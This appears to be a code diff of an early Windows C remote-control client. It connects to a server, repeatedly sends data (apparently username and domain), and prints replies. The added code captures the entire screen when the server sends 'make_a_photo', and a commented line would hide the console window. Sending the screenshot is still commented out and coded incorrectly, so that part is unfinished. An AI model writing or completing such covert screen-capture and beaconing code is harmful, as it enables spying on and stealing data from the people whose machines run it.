@@ -1,14 +1,22 @@
 #include <stdio.h>
 #include <winsock2.h>
 #include <string.h>
+#include <Windows.h>
+// #include <gdiplus.h>
+
 
 #pragma comment(lib, "ws2_32.lib") //Winsock Library
 
 #define DEFAULT_BUFLEN 512
 
+
 HWND hwnd;
+int x1, y1, x2, y2, w, h;
+
 
 int main(){
+
+    hwnd = GetConsoleWindow();
 
     WSADATA wsa;
     int iResult;
@@ -20,6 +28,10 @@ int main(){
     char login[256];
     printf("Enter your login: ");
     scanf("%s", login);
+
+    // ShowWindow(hwnd, SW_HIDE); Скрывает окно и активирует другое окно.
+    Sleep(1000);
+
 
     printf("\nInitialising Winsock...");
 
@@ -70,25 +82,14 @@ int main(){
 
     char recvbuf[DEFAULT_BUFLEN];
     int recvbuflen = DEFAULT_BUFLEN;
-    // send(s, sendbuf, (int)strlen(sendbuf),  0);
-    // printf("Connected.");
-    // closesocket(s);
-    // WSACleanup();
+
 
     while (1){
-        // printf("%s\n", username);
-        // printf("%s\n", userdomain);
-        // printf("%s\n",sendbuf);
+
         send(s, send_data, (int)strlen(send_data),  0);
 
-        // iResult = shutdown(s, SD_SEND);
-        // if (iResult == SOCKET_ERROR) {
-        //     printf("shutdown failed: %d\n", WSAGetLastError());
-        //     closesocket(s);
-        //     WSACleanup();
-        //     return 1;
-        // }
         char recvbuf[DEFAULT_BUFLEN] = "";
+
         iResult = recv(s, recvbuf, recvbuflen, 0);
         if ( iResult > 0 )
             printf("Bytes received: %d\n", iResult);
@@ -99,7 +100,30 @@ int main(){
 
         printf("%s\n", recvbuf);
 
+        char chek[] = "make_a_photo";
         
+        if (strcmp(recvbuf, chek) == 0){
+
+            x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
+            y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
+            x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+            y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+            w = x2 - x1;
+            h = y2 - y1;
+
+            HDC hScreen = GetDC(NULL);
+            HDC hDC = CreateCompatibleDC(hScreen);
+            HBITMAP hbitmap = CreateCompatibleBitmap(hScreen, w, h);
+            HGDIOBJ old_obj = SelectObject(hDC, hbitmap);
+
+            BOOL bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
+
+            // send(s, hbitmap, (int)strlen(send_data_new),  0);
+        }
+        else {
+            printf("not equal");
+        }
 
         Sleep(1000);
     }
